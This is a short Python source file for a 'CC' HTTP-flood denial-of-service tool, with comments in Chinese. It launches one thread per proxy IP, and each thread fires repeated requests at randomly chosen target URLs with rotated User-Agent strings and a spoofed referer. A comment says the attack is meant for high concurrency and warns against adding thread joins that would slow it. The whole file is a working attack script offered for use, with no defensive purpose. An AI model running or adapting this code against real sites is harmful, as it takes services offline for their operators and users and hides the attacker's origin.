from random import randint

from requests import get
import threading


class CcCrawl:
    def __init__(self, concurrentnumber, target_urls, headers):
        """

        :param concurrentnumber:并发数
        :param target_urls:请求的urls列表
        """
        self.urls = target_urls
        self.headers = headers
        self.concurrentnumber = concurrentnumber

    def parseurl(self, proxy):
        """
        运用代理发送对urls中随机获取的url发送请求
        :param proxy:代理
        :return:
        """
        proxies = {'http': 'http://' + proxy}

        # 每个ip攻击concurrentnumber次
        for i in range(0, self.concurrentnumber):
            headers = {"User-Agent": self.headers[randint(0, len(self.headers) - 1)],
                       'referer': 'http://blog.csdn.net'}

            get(url=self.urls[randint(0, len(self.urls) - 1)], proxies=proxies, headers=headers)
            print("{}-proxies:{},headers:{}发起攻击".format(i, proxies, headers))

    def run(self, ip_list):
        """
        :param ip_list:
        :return:
        """
        print("-" * 50)
        print("开始新一轮攻击")
        threadtasks = list()
        # 有多少个ip就发起多少个线程进行攻击
        for ip in ip_list:
            threadtasks.append(threading.Thread(target=self.parseurl, args=[ip]))

        # 线程全启动
        for num in range(len(threadtasks)):
            threadtasks[num].start()
        """
        请不要添加.join()
        这将会阻塞进程，发送大量请求需要时间，但cc攻击要实现高并发，阻塞进程就实现不了高并发
        """
